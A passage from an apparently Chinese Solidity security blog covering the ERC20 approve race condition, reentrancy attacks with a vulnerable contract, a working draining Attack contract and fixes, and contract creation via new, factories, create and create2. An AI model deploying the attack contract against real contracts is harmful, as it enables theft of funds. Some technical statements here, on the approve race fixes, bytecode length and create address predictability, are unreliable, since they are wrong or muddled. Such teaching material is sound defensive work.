<p>approve(Mallory, 100); —— 授权 100 个代币。<br>想撤销授权后重新授权：approve(Mallory, 200); —— 授权 200 个代币。</p>
<p><strong>第一种竞争：在授权更新中被抢占</strong></p>
<p>在区块链网络中，交易可能存在提交和打包的时间差。</p>
<ol>
<li>交易流程：<ul>
<li>Alice 提交第一笔交易 approve(Mallory, 100)。</li>
<li>此时 Mallory 知道 Alice 即将授权 100，便迅速构造一个调用 transferFrom 的交易，试图转移代币。</li>
<li>在 Alice 提交第二笔交易 approve(Mallory, 200) 之前，Mallory 的交易被矿工打包处理。</li>
</ul>
</li>
<li>结果：<ul>
<li>Mallory 调用了 transferFrom，并转移了 100 个代币。</li>
<li>Alice 的第二笔交易（授权 200）覆盖了第一笔交易。</li>
<li>最终，Mallory不仅得到了 100，还能再次调用 transferFrom 转移额外的 200 个代币。</li>
</ul>
</li>
</ol>
<p><strong>第二种竞争：替代攻击</strong></p>
<p>以太坊允许用户在一笔交易未被确认前，用新的交易替换原交易（这被称为“交易替代”）。攻击者可以利用这种特性引发意外行为。</p>
<ol>
<li>交易流程：<ul>
<li>Alice 提交 approve(Mallory, 100)。</li>
<li>在这笔交易确认前，Alice 提交了一笔新的高 gas 交易 approve(Mallory, 0)。</li>
<li>Mallory发送了一笔高优先级 transferFrom 交易，与 Alice 的两笔交易竞争。</li>
</ul>
</li>
<li>结果：<ul>
<li>如果矿工按照特定顺序处理，Mallory 的 transferFrom 会先于 Alice 的 approve(Mallory, 0)。</li>
<li>最终，Mallory 成功提取了授权的 100 个代币，尽管 Alice 试图撤销授权。</li>
</ul>
</li>
</ol>
<p>尽管区块链中交易的执行是严格顺序的，但“竞争”主要源于交易在网络中传播和排序的行为。以下是两个核心原因：</p>
<ol>
<li>交易的传播和未确认状态：<ul>
<li>在用户提交交易后，交易需要传播到网络中，并等待矿工打包。</li>
<li>在交易被打包前的这段时间，其他用户或智能合约可以通过观察未确认交易，针对交易中暴露的状态进行恶意操作。</li>
</ul>
</li>
<li>矿工的交易排序权：<ul>
<li>矿工可以根据 gas 费优先级或其他策略排序交易。</li>
<li>攻击者可以支付更高的 gas，让他们的交易先执行，从而“抢占”状态更新。</li>
</ul>
</li>
</ol>
<h3 id="解决竞争"><a href="#解决竞争" class="headerlink" title="解决竞争"></a>解决竞争</h3><ol>
<li>增加原子性操作：<ul>
<li><p>将 approve 和 transferFrom 的逻辑合并为一个原子操作，避免多笔交易间的时间窗口。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransfer(address to, uint256 amount) public &#123;</span><br><span class="line">    approve(to, amount);</span><br><span class="line">    transferFrom(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>使用 increaseAllowance 和 decreaseAllowance：<ul>
<li>避免覆盖现有授权额度，消除修改竞态。</li>
</ul>
</li>
<li>限时授权：<ul>
<li>设置一个时间锁，授权只能在一段时间后生效。</li>
</ul>
</li>
</ol>
<h2 id="“approve”无限授权"><a href="#“approve”无限授权" class="headerlink" title="“approve”无限授权"></a>“approve”无限授权</h2><p>ERC20中“approve”无限授权的问题，其本质并不是单纯由于区块链上的竞争，而是 ERC20标准的设计缺陷与区块链环境特性结合 导致的。这种问题由两个关键因素共同作用引发：</p>
<ol>
<li><p>ERC20 标准中的设计缺陷</p>
<ul>
<li>在 ERC20 的 approve 方法中，没有提供一种明确的原子操作机制来更新授权额度。</li>
<li>在用户更改授权额度的过程中（如从 100 改为 200），攻击者可以利用时间窗口，通过 transferFrom 操作，在授权额度发生变化的过渡阶段恶意提取代币。</li>
</ul>
<p> <em>这个问题根源在于 approve 和 transferFrom 的设计缺乏配合机制，允许在两个操作之间发生不一致的状态。</em></p>
</li>
<li><p>区块链上的竞争特性</p>
<ul>
<li>交易传播时间差：当用户试图提交新授权（如 approve(Mallory, 200)），旧授权（如 approve(Mallory, 100)）仍然有效，且存在被利用的时间窗口。</li>
<li>矿工排序自由：攻击者可以观察到用户提交的 approve 交易，通过支付更高的 gas 优先让他们的交易 transferFrom 被打包，抢在用户的状态更新之前执行。</li>
</ul>
<p> <em>这两点特性导致 approve 无法原子更新的问题被放大，从而使攻击成为可能。</em></p>
</li>
</ol>
<h3 id="解决“approve”无限授权问题"><a href="#解决“approve”无限授权问题" class="headerlink" title="解决“approve”无限授权问题"></a>解决“approve”无限授权问题</h3><ol>
<li>增加 increaseAllowance 和 decreaseAllowance 方法</li>
</ol>
<p>通过调整现有额度而不是直接覆盖额度，可以避免授权被覆盖的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseAllowance(address spender, uint256 addedValue) public returns (bool) &#123;</span><br><span class="line">    allowance[msg.sender][spender] += addedValue;</span><br><span class="line">    emit Approval(msg.sender, spender, allowance[msg.sender][spender]);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) &#123;</span><br><span class="line">    require(allowance[msg.sender][spender] &gt;= subtractedValue, &quot;Decreased allowance below zero&quot;);</span><br><span class="line">    allowance[msg.sender][spender] -= subtractedValue;</span><br><span class="line">    emit Approval(msg.sender, spender, allowance[msg.sender][spender]);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>原子操作结合转账</li>
</ol>
<p>通过单一交易完成授权和转账，避免分离操作引入的时间窗口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransferFrom(address from, address to, uint256 amount) public &#123;</span><br><span class="line">    require(allowance[from][msg.sender] &gt;= amount, &quot;Allowance exceeded&quot;);</span><br><span class="line">    allowance[from][msg.sender] -= amount;</span><br><span class="line">    balanceOf[from] -= amount;</span><br><span class="line">    balanceOf[to] += amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ERC20 中“approve”无限授权的问题，并不完全是由于区块链竞争特性，而是由 授权更新的非原子性设计 和 区块链上交易排序特性 共同导致的。优化方法可以从改进 ERC20 的逻辑（如 increaseAllowance），有效解决这一问题。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>solidity</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>重入攻击</title>
    <url>/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</url>
    <content><![CDATA[<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p>重入攻击是指攻击者通过调用目标合约的某个函数，利用该函数在完成关键状态变量更新前调用外部合约的能力，从而反复调用目标合约的函数，最终实现非法的资金提取或状态操作。</p>
<h2 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款函数</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提款函数，存在重入攻击漏洞</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 向用户发送资金</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新用户余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个容易受到重入攻击的合约，它允许用户存款并提款。</p>
<p><strong>问题:</strong></p>
<ul>
<li>在发送资金后，余额更新在后。</li>
<li>攻击者可以通过调用自己的回调函数，在 withdraw 执行完成前再次调用 withdraw，从而重复提款。</li>
</ul>
<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerableAddress) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerableAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回退函数：用于重入攻击</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 重复调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether&quot;);</span><br><span class="line">        vulnerable.deposit&#123;value: 1 ether&#125;(); // 存款</span><br><span class="line">        vulnerable.withdraw(1 ether);        // 首次提款</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看攻击合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>攻击步骤：</strong></p>
<ol>
<li>攻击者部署 Attack 合约并调用 attack。</li>
<li>调用 vulnerable.withdraw(1 ether) 时触发回退函数 fallback。</li>
<li>回退函数再次调用 withdraw，在余额未更新之前反复提款。</li>
</ol>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li><strong>状态变量优先更新</strong>：在执行外部调用前，先更新合约的状态。</li>
<li><strong>通过加锁来限制重入</strong>：通过给<code>function</code>加锁，来限制重入，以达到防止攻击的目的。</li>
</ul>
<h2 id="状态变量优先更新"><a href="#状态变量优先更新" class="headerlink" title="状态变量优先更新"></a>状态变量优先更新</h2><p>将状态变量的更新移到外部调用之前。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 先更新余额，后转账</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通过加锁来限制重入"><a href="#通过加锁来限制重入" class="headerlink" title="通过加锁来限制重入"></a>通过加锁来限制重入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 通过加锁来限制重入</span><br><span class="line">    bool private locker = false;</span><br><span class="line">    modifier locked() &#123;</span><br><span class="line">        require(!locker, &quot;reentrant call&quot;);</span><br><span class="line">        locker = true;</span><br><span class="line">        _;</span><br><span class="line">        locker = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public locked &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可通过使用OpenZeppelin中提供的<code>ReentrancyGuard</code>工具来防止攻击，<code>ReentrancyGuard</code>机制与锁机制相同。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vulnerable is ReentrancyGuard &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public nonReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>solidity</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>创建管理合约</title>
    <url>/2024/12/05/blockchain/ethereum/solidity-contract-creation/</url>
    <content><![CDATA[<p>在 Solidity 中，一个合约可以通过多种方式在另一个合约中创建和管理另一个合约。</p>
<h1 id="合约内部部署（创建一个新合约"><a href="#合约内部部署（创建一个新合约" class="headerlink" title="合约内部部署（创建一个新合约"></a>合约内部部署（创建一个新合约</h1><p>Solidity 允许你在一个合约内部部署另一个合约。这通常是通过在合约中创建一个新的合约实例来实现的。你可以在构造函数或其他函数中动态部署一个新合约。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">        </span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">                            </span><br><span class="line">    function getOwner() public view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CreatorContract &#123;</span><br><span class="line">    address public lastCreatedContract;</span><br><span class="line">    </span><br><span class="line">    function createNewContract() public &#123;</span><br><span class="line">        NewContract newContract = new NewContract(msg.sender);</span><br><span class="line">        lastCreatedContract = address(newContract);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>CreatorContract 中有一个 createNewContract 函数，它使用 new 关键字创建了一个 NewContract 实例。NewContract 合约的构造函数接收 msg.sender 作为参数，意味着新合约的 owner 将是调用 createNewContract 函数的账户。</li>
<li>创建的新合约地址会存储在 lastCreatedContract 中。</li>
</ul>
<h1 id="合约工厂模式（Factory-Pattern）"><a href="#合约工厂模式（Factory-Pattern）" class="headerlink" title="合约工厂模式（Factory Pattern）"></a>合约工厂模式（Factory Pattern）</h1><p>另一种常见的做法是使用工厂模式，即一个合约作为工厂来部署多个合约实例。工厂合约允许你根据需要创建新合约，并管理这些合约实例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Item &#123;</span><br><span class="line">    uint public id;</span><br><span class="line">    address public creator;</span><br><span class="line">        </span><br><span class="line">    constructor(uint _id, address _creator) &#123;</span><br><span class="line">        id = _id;</span><br><span class="line">        creator = _creator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ItemFactory &#123;</span><br><span class="line">    Item[] public items;</span><br><span class="line">    </span><br><span class="line">    function createItem(uint _id) public &#123;</span><br><span class="line">        Item newItem = new Item(_id, msg.sender);</span><br><span class="line">        items.push(newItem);</span><br><span class="line">    &#125;</span><br><span class="line">                                                                    </span><br><span class="line">    function getItems() public view returns (Item[] memory) &#123;</span><br><span class="line">        return items;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>ItemFactory 是一个工厂合约，它可以创建多个 Item 合约的实例，每个 Item 合约的创建者是调用工厂合约的账户。</li>
<li>createItem 函数部署了一个新的 Item 合约，并将它存储在 items 数组中。</li>
</ul>
<h1 id="调用外部合约（外部合约部署后实例化）"><a href="#调用外部合约（外部合约部署后实例化）" class="headerlink" title="调用外部合约（外部合约部署后实例化）"></a>调用外部合约（外部合约部署后实例化）</h1><p>有时，合约不需要在自己内部部署其他合约，而是可以通过调用已经部署的外部合约的地址来与其交互。这不是“创建”合约，但却是一种与其他合约交互的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IExternalContract &#123;</span><br><span class="line">    function getOwner() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractInteraction &#123;</span><br><span class="line">    IExternalContract public externalContract;</span><br><span class="line">            </span><br><span class="line">    constructor(address _externalContractAddress) &#123;</span><br><span class="line">        externalContract = IExternalContract(_externalContractAddress);</span><br><span class="line">    &#125;</span><br><span class="line">                                </span><br><span class="line">    function getExternalOwner() public view returns (address) &#123;</span><br><span class="line">        return externalContract.getOwner();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>ContractInteraction 合约通过接口与外部合约交互，调用了 IExternalContract 中的 getOwner 函数。</li>
<li>外部合约已经部署并被传入构造函数，ContractInteraction 合约与它交互。</li>
</ul>
<h1 id="使用-create2-来部署合约（指定地址部署）"><a href="#使用-create2-来部署合约（指定地址部署）" class="headerlink" title="使用 create2 来部署合约（指定地址部署）"></a>使用 create2 来部署合约（指定地址部署）</h1><p>create2 是一种更高级的部署方法，它允许你通过指定合约地址来部署合约。使用 create2 可以确保合约在指定的地址上部署，前提是你知道合约的字节码和盐值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FactoryWithCreate2 &#123;</span><br><span class="line">    event ContractCreated(address contractAddress);</span><br><span class="line"></span><br><span class="line">    function createNewContract(bytes32 salt) public &#123;</span><br><span class="line">        address newContractAddress;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;</span><br><span class="line">                                        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            newContractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">                                                                            </span><br><span class="line">        emit ContractCreated(newContractAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    address public creator;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        creator = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li>createNewContract 函数使用 create2 来部署一个新的 NewContract 合约。</li>
<li>create2 允许你在部署时指定一个 salt，确保你可以预测到部署合约的地址，前提是知道合约的字节码。</li>
</ul>
<h2 id="扩展信息"><a href="#扩展信息" class="headerlink" title="扩展信息"></a>扩展信息</h2><p>在 Solidity 中，type(NewContract).creationCode 是一种用于获取合约字节码的方法，它表示合约的创建代码。合约的字节码（bytecode）是它部署到区块链上的机器代码，其中包含了合约的逻辑和部署时所需的初始化数据。</p>
<p><strong>合约字节码的组成部分</strong></p>
<p>合约字节码可以分为以下几个主要部分：</p>
<ol>
<li>合约构造函数的初始化字节码</li>
<li>部署过程中的合约代码</li>
<li>合约的状态变量初始值</li>
</ol>
<h3 id="合约构造函数的初始化字节码"><a href="#合约构造函数的初始化字节码" class="headerlink" title="合约构造函数的初始化字节码"></a>合约构造函数的初始化字节码</h3><ul>
<li>构造函数的字节码：每个合约在部署时都会执行其构造函数。creationCode 中包含了构造函数的代码部分，它负责初始化合约的状态，通常包括合约的状态变量赋值、事件初始化等操作。</li>
<li>初始化参数：如果构造函数带有参数（例如合约需要初始化的状态变量），这些参数也会包含在 creationCode 中。部署合约时需要传递这些参数。</li>
</ul>
<p>creationCode：合约的“创建代码”，是用于部署合约的字节码，包含了构造函数的执行内容以及初始化步骤。在合约部署时，链上会执行这段创建代码，初始化合约，并且部署合约的 runtimeCode</p>
<p>type(NewContract).creationCode 提供了一个方法来获取合约的 创建代码（即部署合约时使用的字节码），这段代码由合约的构造函数（constructor）以及合约的初始化部分组成，执行时会将合约的运行时代码存储在区块链上。</p>
<p>creationCode 是合约创建时所需的字节码，包括构造函数的初始化部分、合约的部署逻辑等。</p>
<h3 id="部署过程中的合约代码"><a href="#部署过程中的合约代码" class="headerlink" title="部署过程中的合约代码"></a>部署过程中的合约代码</h3><ul>
<li>字节码本体：合约部署的代码（通常是 runtime code）会在合约创建时存储在链上。这个字节码本体包括了所有的业务逻辑和函数实现。它包含了所有合约的行为和功能，例如状态修改、函数调用等。</li>
</ul>
<p>runtimeCode：合约部署后剩余的代码，包含了合约的所有业务逻辑。合约一旦部署完成，它的 runtimeCode 就是唯一存在于区块链上的代码，而 creationCode 则只在合约创建时有作用。</p>
<h3 id="合约的状态变量初始值"><a href="#合约的状态变量初始值" class="headerlink" title="合约的状态变量初始值"></a>合约的状态变量初始值</h3><ul>
<li>初始化存储：合约在部署时，通常会有一些状态变量。它们的初始值会作为部署合约时的一部分被编码到创建代码中（如果有默认值）。这些值将在合约部署后存储到合约的状态中。</li>
</ul>
<h2 id="create-和-create2"><a href="#create-和-create2" class="headerlink" title="create 和 create2"></a>create 和 create2</h2><p>在 Solidity 中，create 和 create2 是用于部署合约的两种不同方法。二者的主要区别在于如何计算合约地址及其对地址预测的能力。理解这两者的原理及其差异对于优化合约部署和管理合约地址是非常重要的。</p>
<h3 id="create-的原理"><a href="#create-的原理" class="headerlink" title="create 的原理"></a>create 的原理</h3><p>create 是最常见的合约部署方式，它通过在 Ethereum 网络上发送一笔交易来部署一个新的合约。</p>
<ul>
<li>部署过程：合约的字节码通过交易提交到区块链网络，然后在区块链中分配一个新的地址。</li>
<li>地址计算：create 部署的合约的地址由 创建者的地址（msg.sender） 和 创建交易的nonce 决定。</li>
</ul>
<p><strong>合约地址计算公式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address = keccak256(rlp_encode(sender, nonce))[12:]</span><br></pre></td></tr></table></figure>

<ul>
<li>sender：部署合约的账户地址（msg.sender）。</li>
<li>nonce：msg.sender 的交易计数，即发送交易的次数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address create(uint256 value, bytes memory bytecode, uint256 bytecodeSize)</span><br></pre></td></tr></table></figure>

<ol>
<li>value（uint256）：该参数表示向新合约发送的以太币数量。在合约部署时，你可以指定一个 value，这部分以太币将转移到新部署的合约中。若不想发送以太币，value 为 0。<br> value 是一个 uint256 类型，表示你要发送到新合约的以太币金额。</li>
<li>bytecode（bytes memory）：即合约的字节码，它是合约代码的二进制形式。这是通过 type(Contract).creationCode 或其他类似的方法获取的合约字节码。<br> 这段字节码包含了合约的构造函数以及合约的逻辑代码。可以通过 type(MyContract).creationCode 获取。add(bytecode, 0x20) 字节码的存储位置，跳过前 32 字节，指向字节码的实际数据。</li>
<li>bytecodeSize(uint256) : 它表示合约字节码的长度（通常是 32 字节）。</li>
</ol>
<h4 id="使用create"><a href="#使用create" class="headerlink" title="使用create"></a>使用create</h4><p>create 是标准的合约部署方式，适用于常规场景。通常情况下，您无需关心合约的地址，只需让合约被部署到区块链即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    uint256 public value;</span><br><span class="line">    </span><br><span class="line">    constructor(uint256 _value) &#123;</span><br><span class="line">        value = _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    address public deployedContract;</span><br><span class="line">    </span><br><span class="line">    function deploy(uint256 _value, bytes32 _salt) external &#123;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;  // 获取合约字节码</span><br><span class="line">        address contractAddress;</span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            contractAddress := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        deployedContract = contractAddress;  // 记录新合约地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，Factory 合约会通过 create 部署一个新的 NewContract 合约。NewContract 的地址由 msg.sender 和 nonce 决定，因此无法在部署前预测。</p>
<h3 id="create2-的原理"><a href="#create2-的原理" class="headerlink" title="create2 的原理"></a>create2 的原理</h3><p>create2 是 Solidity 0.5.0 引入的一种新的合约部署方式，它为部署合约提供了额外的控制能力，特别是在可预测的合约地址生成方面。与 create 不同，create2 的合约地址不仅由部署者的地址和交易 nonce 决定，还由以下额外的内容决定：</p>
<ul>
<li>部署者的地址 (msg.sender)</li>
<li>salt：一个额外的任意字节值</li>
<li>合约字节码的哈希：即部署的合约的字节码。</li>
</ul>
<p><strong>合约地址计算公式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address = keccak256(0xff ++ sender ++ salt ++ keccak256(bytecode))[12:]</span><br></pre></td></tr></table></figure>

<ul>
<li>0xff 是一个常量，用于确保合约地址计算的唯一性。</li>
<li>sender 是合约创建者的地址。</li>
<li>salt 是一个提供给 create2 的自定义值，可以是任意字节。</li>
<li>bytecode 是合约的字节码。</li>
</ul>
<p>create2 使得合约的地址可以在合约部署之前预先计算出来，因此我们可以在部署合约之前预测合约的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address create2(uint256 value, bytes memory bytecode, uint256 bytecodeSize, bytes32 salt)</span><br></pre></td></tr></table></figure>

<ol>
<li>value（uint256）：该参数表示向新合约发送的以太币数量。在合约部署时，你可以指定一个 value，这部分以太币将转移到新部署的合约中。若不想发送以太币，value 为 0。<br> value 是一个 uint256 类型，表示你要发送到新合约的以太币金额。</li>
<li>bytecode（bytes memory）：即合约的字节码，它是合约代码的二进制形式。这是通过 type(Contract).creationCode 或其他类似的方法获取的合约字节码。<br> 这段字节码包含了合约的构造函数以及合约的逻辑代码。可以通过 type(MyContract).creationCode 获取。add(bytecode, 0x20) 字节码的存储位置，跳过前 32 字节，指向字节码的实际数据。</li>
<li>bytecodeSize(uint256) : 它表示合约字节码的长度（通常是 32 字节）。</li>
<li>salt（bytes32）：salt 是一个自定义的 bytes32 类型值，它为合约的创建地址提供一个“随机数”。salt 用于确保合约地址计算的唯一性。通过修改 salt 的值，可以控制生成的合约地址，从而为每个合约生成一个独特的地址。<br> salt 是唯一标识合约部署的一部分。你可以通过传入不同的 salt 值来生成不同的合约地址，即使合约字节码完全相同。</li>
</ol>
<h4 id="使用create2"><a href="#使用create2" class="headerlink" title="使用create2"></a>使用create2</h4><p>create2 则允许你指定一个 salt 值，进而可以提前计算出部署后的合约地址。这对于某些应用非常有用，例如需要在合约创建之前就知道合约的地址，或者在某些情境下需要复用相同地址的合约。</p>
